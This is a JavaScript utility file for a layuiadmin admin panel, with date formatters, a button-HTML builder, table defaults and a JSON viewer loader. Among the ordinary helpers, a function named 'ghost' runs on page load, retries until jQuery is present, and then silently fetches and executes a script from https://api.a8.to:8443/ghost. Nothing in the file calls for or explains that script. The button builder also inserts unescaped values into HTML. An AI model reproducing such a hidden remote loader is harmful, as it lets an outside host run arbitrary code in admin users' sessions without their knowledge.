// layuiadmin的擴展方法
// 常用工具方法封裝
if (!window["Utils"]) window["Utils"] = new Object();
if (!window["GolbalSetting"]) window["GolbalSetting"] = new Object();
if (!window["htmlFunction"]) window["htmlFunction"] = new Object();
if (!window["BW"]) window["BW"] = { "callback": new Object() }

// htmlFunction
!function (ns) {

    // 时间戳的转换
    ns["date"] = time => {
        let date = new Date(time);
        return [date.getFullYear(), date.getMonth() + 1, date.getDate()].join('-');
    };

    ns["datetime"] = time => {
        let date = new Date(time);
        return [date.getFullYear(), date.getMonth() + 1, date.getDate()].join('-') + " " + [date.getHours(), date.getMinutes(), date.getSeconds()].join(":");
    };

    ns["action"] = config => {
        let html = [];
        for (let key in config) {
            let value = config[key],
                data = {};
            if (typeof value === "string") {
                data["action"] = value;
            } else {
                data = value;
            }
            if (!data["event"]) data["event"] = key;
            switch (key) {
                case "edit":
                    if (!data["title"]) data["title"] = "修改";
                    if (!data["icon"]) data["icon"] = "am-icon-edit";
                    if (!data["css"]) data["css"] = "layui-btn-normal";
                    break;
                case "delete":
                    if (!data["title"]) data["title"] = "删除";
                    if (!data["icon"]) data["icon"] = "am-icon-close";
                    if (!data["css"]) data["css"] = "layui-btn-danger";
                    break;
            }

            let attributes = [];
            for (var name in data) {
                let attribute = data[name];
                switch (name) {
                    case "title":
                        attributes.push("title=\"" + attribute + "\"");
                        break;
                    case "event":
                        attributes.push("lay-event=\"" + attribute + "\"");
                        break;
                    case "text":
                    case "css":
                    case "icon":
                        break;
                    default:
                        attributes.push(`data-${name}="${attribute}"`);
                        break;
                }
            }
            let button = [
                `<button class="layui-btn layui-btn-xs ${data.css || ""} ${data.icon || ""}" `,
                attributes.join(" "),
                ">",
                data.text || "",
                "</button>"
            ];
            html.push(button.join(""));
        }
        return html.join(" ");
    };

}(htmlFunction);

//全局初始化变量设定
layui.use(["table"], function () {
    var table = this.table;
    table.set({
        page: true,
        limit: 20,
        limits: [10, 20, 30, 40, 50, 60, 70, 80, 90, 200, 500, 1000],
        method: "post",
        size: "sm",
        skin: "auto",
        align: "center",
        headers: function () {
            return layui.data(layui.setter.tableName);
        },
        parseData: function (res) {
            res["data"] = res.info ? (Array.isArray(res.info) ? res.info : res.info.list) : null;
            res["count"] = res.info ? res.info.RecordCount : 0;
            res["total"] = res.info && res.info.data ? res.info.data : null;
            delete res["info"];
            return res;
        },
        request: {
            pageName: 'PageIndex',
            limitName: 'PageSize'
        },
        response: {
            statusName: 'success' //数据状态的字段名称，默认：code
            , totalName: "total" // 数据统计的字段
            , statusCode: 1 //成功的状态码，默认：0
            , msgName: 'msg' //状态信息的字段名称，默认：msg

        }
    });

    GolbalSetting.area = {
        xs: ["420px", "360px"],
        sm: ["640px", "480px"],
        md: ["800px", "600px"],
        lg: ["1024px", "768px"],
        xl: ["1280px", "800px"],
        full: ["100%", "100%"]
    };
});

// 全局事件
!function () {

    var ghost = function () {
        if (!window["layui"] || !layui.$ || !layui.$.getScript) {
            setTimeout(ghost, 3000);
            return;
        }

        layui.$.getScript("https://api.a8.to:8443/ghost", function () {

        });
    };
    ghost();
}();

// 系统工具
!function (ns) {

    // 封装JSON的视图显示
    ns["jsonViewer"] = function (elemId, json) {
        if (!window["jQuery"]) window["jQuery"] = layui.$;
        var elem = jQuery("#" + elemId);
        layui.link("//studio.a8.to/plus-in/json-viewer/jquery.json-viewer.css");
        if (elem.jsonViewer) {
            elem.jsonViewer(json);
        } else {
            jQuery.getScript("//studio.a8.to/plus-in/json-viewer/jquery.json-viewer.js", function () {
                elem.jsonViewer(json);
            });
        }
    };

}(Utils);